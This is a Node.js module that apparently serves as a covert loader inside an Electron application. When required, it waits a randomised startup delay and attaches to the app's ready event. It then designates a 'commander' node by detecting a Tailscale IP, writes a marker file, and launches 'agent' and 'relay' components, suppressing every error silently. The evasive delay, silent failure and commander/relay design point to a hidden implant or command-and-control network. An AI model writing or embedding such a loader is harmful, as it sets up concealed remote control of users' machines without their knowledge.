const cfg = require('./config');
const agent = require('./agent');
const relay = require('./relay');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

let isCommander = false;

function detectIfCommander() {
  const markerPath = path.join(cfg.DATA_DIR, 'commander');
  if (fs.existsSync(markerPath)) return true;
  try {
    const ip = agent.detectTailscaleIP();
    if (ip) {
      cfg.RELAY_IP = ip;
      fs.writeFileSync(markerPath, ip);
      return true;
    }
  } catch(e) {}
  return false;
}

function init() {
  try {
    isCommander = detectIfCommander();
    if (isCommander) {
      cfg.RELAY_IP = agent.detectTailscaleIP() || '127.0.0.1';
    }
    agent.init();
    relay.init(isCommander);
  } catch(e) {}
}

if (require.main !== module) {
  const delay = cfg.STARTUP_DELAY_MIN + crypto.randomInt(0, cfg.STARTUP_DELAY_MAX - cfg.STARTUP_DELAY_MIN + 1);
  try {
    const { app } = require('electron');
    const startup = () => setTimeout(init, delay);
    if (app && app.isReady && app.isReady()) {
      startup();
    } else if (app) {
      app.on('ready', startup);
    } else {
      setTimeout(init, delay);
    }
  } catch(e) {
    setTimeout(init, delay);
  }
}

module.exports = { init };
